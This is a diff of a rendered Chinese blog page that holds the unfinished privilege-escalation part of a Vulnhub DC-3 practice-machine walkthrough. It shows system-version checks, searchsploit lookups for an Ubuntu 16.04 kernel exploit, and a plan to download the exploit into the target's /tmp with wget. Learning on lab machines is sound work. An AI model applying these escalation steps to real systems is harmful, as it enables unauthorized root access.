-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure></li>
-<li><p>查看操作系统的发行版本信息</p>
+<ol>
+<li>
+<p>查看操作系统的版本信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>查看操作系统的发行版本信息</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/27.png"></p></li>
+<p><img src="/2022/06/11/Vulnhub-DC-3/27.png" alt></p>
+</li>
 </ol>
 <p>得到对应的版本信息</p>
 <blockquote>
@@ -278,23 +300,22 @@
 </blockquote>
 <p>那么就去寻找看看它是否有漏洞</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ubuntu 16.04</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/28.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/28.png" alt></p>
 <p>可以看到有很多的漏洞，我们该如何选择呢</p>
 <p>通过上面得到的Linux的版本信息和Ubuntu是32位的我们可以排除掉一些，最后只剩下几个</p>
-<p><img src="/2022/06/11/Vulnhub-DC-3/29.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/29.png" alt></p>
 <p>然后因为C语言的脚本用起来比较复杂，所以我们优先看看39772.txt这个文件</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -x linux/local/39772.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/11/Vulnhub-DC-3/30.png"></p>
+<p><img src="/2022/06/11/Vulnhub-DC-3/30.png" alt></p>
 <p>里面告诉我们要去Github下载它的压缩包</p>
 <p>然后我们要找到目标主机上可以上传文件的地方，然后用<code>wget</code>进行下载即可，比如tmp目录，这是一个用来存储临时文件的地方，所以我们有权限往里面上传文件</p>
-<p>..........</p>
+<p>…</p>
 <p>出了点小问题，待续</p>
-<h1 id="参考文章">参考文章</h1>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61237064/article/details/123546254?spm=1001.2014.3001.5502">dc-3
-靶机渗透学习_ZredamanJ的博客-CSDN博客_dc3靶机</a></p>
+<h1>参考文章</h1>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61237064/article/details/123546254?spm=1001.2014.3001.5502">dc-3 靶机渗透学习_ZredamanJ的博客-CSDN博客_dc3靶机</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45996361/article/details/123054544">Vulnhub靶机：DC-3渗透详细过程_1erkeU的博客-CSDN博客</a></p>
 <p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1818091">反弹Shell,看这一篇就够了-腾讯云开发者社区-腾讯云</a></p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://cgrona.top">cgrona</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://cgrona.top/2022/06/11/Vulnhub-DC-3/">https://cgrona.top/2022/06/11/Vulnhub-DC-3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://cgrona.top" target="_blank">风清竹喧</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a><a class="post-meta__tags" href="/tags/web/">web</a></div><div class="post_share"><div class="social-share" data-image="https://img.cgrona.top/Blog_img/26.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/07/04/Vulnhub-DC-4/"><img class="prev-cover" src="https://img.cgrona.top/Blog_img/27.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Vulnhub-DC-4渗透学习</div></div></a></div><div class="next-post pull-right"><a href="/2022/06/09/Vulnhub-DC-2/"><img class="next-cover" src="https://img.cgrona.top/Blog_img/15.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Vulnhub-DC-2渗透学习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/06/08/Vulnhub-DC-1/" title="Vulnhub-DC-1渗透学习"><img class="cover" src="https://img.cgrona.top/Blog_img/23.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-08</div><div class="title">Vulnhub-DC-1渗透学习</div></div></a></div><div><a href="/2022/06/09/Vulnhub-DC-2/" title="Vulnhub-DC-2渗透学习"><img class="cover" src="https://img.cgrona.top/Blog_img/15.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-09</div><div class="title">Vulnhub-DC-2渗透学习</div></div></a></div><div><a href="/2022/07/07/Vulnhub-DC-5/" title="Vulnhub-DC-5渗透学习"><img class="cover" src="https://img.cgrona.top/Blog_img/5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-07</div><div class="title">Vulnhub-DC-5渗透学习</div></div></a></div><div><a href="/2022/07/04/Vulnhub-DC-4/" title="Vulnhub-DC-4渗透学习"><img class="cover" src="https://img.cgrona.top/Blog_img/27.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-04</div><div class="title">Vulnhub-DC-4渗透学习</div></div></a></div><div><a href="/2022/08/12/Vulnhub-DC-6/" title="Vulnhub-DC-6渗透学习"><img class="cover" src="https://img.cgrona.top/Blog_img/14.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-12</div><div class="title">Vulnhub-DC-6渗透学习</div></div></a></div><div><a href="/2022/08/14/Vulnhub-DC-7/" title="Vulnhub-DC-7渗透学习"><img class="cover" src="https://img.cgrona.top/Blog_img/28.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-14</div><div class="title">Vulnhub-DC-7渗透学习</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">cgrona</div><div class="author-info__description">选择有时候比努力更重要</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cgrona"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/cgrona" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1549692438@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎阅读😊</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">一、环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">二、信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E5%AE%9E%E6%88%98"><span class="toc-text">三、实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">1、漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0"><span class="toc-text">2、登录后台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell%E5%B9%B6%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">3、getshell并反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">4、提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/06/11/gradient-descent/" title="梯度下降"><img src="https://img.cgrona.top/Blog_img/31.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="梯度下降"/></a><div class="content"><a class="title" href="/2023/06/11/gradient-descent/" title="梯度下降">梯度下降</a><time datetime="2023-06-11T07:10:08.000Z" title="发表于 2023-06-11 15:10:08">2023-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/" title="CFS三层靶机内网渗透"><img src="https://img.cgrona.top/Blog_img/30.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CFS三层靶机内网渗透"/></a><div class="content"><a class="title" href="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/" title="CFS三层靶机内网渗透">CFS三层靶机内网渗透</a><time datetime="2023-02-27T06:03:14.000Z" title="发表于 2023-02-27 14:03:14">2023-02-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全"><img src="https://img.cgrona.top/Blog_img/10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网安全"/></a><div class="content"><a class="title" href="/2022/10/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">内网安全</a><time datetime="2022-10-26T04:36:40.000Z" title="发表于 2022-10-26 12:36:40">2022-10-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/07/VMnet/" title="桥接模式、NAT模式和仅主机模式"><img src="https://img.cgrona.top/Blog_img/18.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="桥接模式、NAT模式和仅主机模式"/></a><div class="content"><a class="title" href="/2022/10/07/VMnet/" title="桥接模式、NAT模式和仅主机模式">桥接模式、NAT模式和仅主机模式</a><time datetime="2022-10-07T05:29:04.000Z" title="发表于 2022-10-07 13:29:04">2022-10-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/" title="传输文件还原"><img src="https://img.cgrona.top/Blog_img/29.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="传输文件还原"/></a><div class="content"><a class="title" href="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/" title="传输文件还原">传输文件还原</a><time datetime="2022-10-04T02:12:28.000Z" title="发表于 2022-10-04 10:12:28">2022-10-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By cgrona</div><div class="icp"><a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/"><img class="icp-icon" src="/img/2022002701.png"/><span>桂ICP备2022002701号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://cgrona.top">cgrona</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://cgrona.top/2022/06/11/Vulnhub-DC-3/">https://cgrona.top/2022/06/11/Vulnhub-DC-3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://cgrona.top" target="_blank">风清竹喧</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a></div><div class="post_share"><div class="social-share" data-image="https://img.cgrona.top/Blog_img/26.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/07/04/Vulnhub-DC-4/"><img class="prev-cover" src="https://img.cgrona.top/Blog_img/27.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Vulnhub-DC-4渗透学习</div></div></a></div><div class="next-post pull-right"><a href="/2022/06/09/Vulnhub-DC-2/"><img class="next-cover" src="https://img.cgrona.top/Blog_img/15.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Vulnhub-DC-2渗透学习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/06/08/Vulnhub-DC-1/" title="Vulnhub-DC-1渗透学习"><img class="cover" src="https://img.cgrona.top/Blog_img/23.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-08</div><div class="title">Vulnhub-DC-1渗透学习</div></div></a></div><div><a href="/2022/06/09/Vulnhub-DC-2/" title="Vulnhub-DC-2渗透学习"><img class="cover" src="https://img.cgrona.top/Blog_img/15.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-09</div><div class="title">Vulnhub-DC-2渗透学习</div></div></a></div><div><a href="/2022/07/04/Vulnhub-DC-4/" title="Vulnhub-DC-4渗透学习"><img class="cover" src="https://img.cgrona.top/Blog_img/27.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-04</div><div class="title">Vulnhub-DC-4渗透学习</div></div></a></div><div><a href="/2022/07/07/Vulnhub-DC-5/" title="Vulnhub-DC-5渗透学习"><img class="cover" src="https://img.cgrona.top/Blog_img/5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-07</div><div class="title">Vulnhub-DC-5渗透学习</div></div></a></div><div><a href="/2022/08/12/Vulnhub-DC-6/" title="Vulnhub-DC-6渗透学习"><img class="cover" src="https://img.cgrona.top/Blog_img/14.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-12</div><div class="title">Vulnhub-DC-6渗透学习</div></div></a></div><div><a href="/2022/08/14/Vulnhub-DC-7/" title="Vulnhub-DC-7渗透学习"><img class="cover" src="https://img.cgrona.top/Blog_img/28.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-14</div><div class="title">Vulnhub-DC-7渗透学习</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">cgrona</div><div class="author-info__description">选择有时候比努力更重要</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cgrona"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/cgrona" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1549692438@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎阅读😊</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">一、环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">二、信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">三、实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">1、漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0"><span class="toc-text">2、登录后台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-getshell%E5%B9%B6%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">3、getshell并反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%8F%90%E6%9D%83"><span class="toc-text">4、提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/06/11/gradient-descent/" title="梯度下降"><img src="https://img.cgrona.top/Blog_img/31.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="梯度下降"/></a><div class="content"><a class="title" href="/2023/06/11/gradient-descent/" title="梯度下降">梯度下降</a><time datetime="2023-06-11T07:10:08.000Z" title="发表于 2023-06-11 15:10:08">2023-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/" title="CFS三层靶机内网渗透"><img src="https://img.cgrona.top/Blog_img/30.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CFS三层靶机内网渗透"/></a><div class="content"><a class="title" href="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/" title="CFS三层靶机内网渗透">CFS三层靶机内网渗透</a><time datetime="2023-02-27T06:03:14.000Z" title="发表于 2023-02-27 14:03:14">2023-02-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全"><img src="https://img.cgrona.top/Blog_img/10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网安全"/></a><div class="content"><a class="title" href="/2022/10/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">内网安全</a><time datetime="2022-10-26T04:36:40.000Z" title="发表于 2022-10-26 12:36:40">2022-10-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/07/VMnet/" title="桥接模式、NAT模式和仅主机模式"><img src="https://img.cgrona.top/Blog_img/18.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="桥接模式、NAT模式和仅主机模式"/></a><div class="content"><a class="title" href="/2022/10/07/VMnet/" title="桥接模式、NAT模式和仅主机模式">桥接模式、NAT模式和仅主机模式</a><time datetime="2022-10-07T05:29:04.000Z" title="发表于 2022-10-07 13:29:04">2022-10-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/" title="传输文件还原"><img src="https://img.cgrona.top/Blog_img/29.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="传输文件还原"/></a><div class="content"><a class="title" href="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/" title="传输文件还原">传输文件还原</a><time datetime="2022-10-04T02:12:28.000Z" title="发表于 2022-10-04 10:12:28">2022-10-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By cgrona</div><div class="icp"><a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/"><img class="icp-icon" src="/img/2022002701.png"/><span>桂ICP备2022002701号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
   endLoading: () => {
     document.body.style.overflow = 'auto';
     document.getElementById('loading-box').classList.add("loaded")
@@ -305,52 +326,7 @@
 
   }
 }
-window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (!window.MathJax) {
-  window.MathJax = {
-    tex: {
-      inlineMath: [ ['$','$'], ["\\(","\\)"]],
-      tags: 'ams'
-    },
-    chtml: {
-      scale: 1.2
-    },
-    options: {
-      renderActions: {
-        findScript: [10, doc => {
-          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
-            const display = !!node.type.match(/; *mode=display/)
-            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
-            const text = document.createTextNode('')
-            node.parentNode.replaceChild(text, node)
-            math.start = {node: text, delim: '', n: 0}
-            math.end = {node: text, delim: '', n: 0}
-            doc.math.push(math)
-          }
-        }, ''],
-        insertScript: [200, () => {
-          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
-            const target = node.parentNode
-            if (target.nodeName.toLowerCase() === 'li') {
-              target.parentNode.classList.add('has-jax')
-            } else {
-              target.classList.add('has-jax')
-            }
-          });
-        }, '', false]
-      }
-    }
-  }
-  
-  const script = document.createElement('script')
-  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
-  script.id = 'MathJax-script'
-  script.async = true
-  document.head.appendChild(script)
-} else {
-  MathJax.startup.document.state(0)
-  MathJax.texReset()
-  MathJax.typeset()
-}</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
 POWERMODE.shake = false;
 POWERMODE.mobile = true;
 document.body.addEventListener('input', POWERMODE);
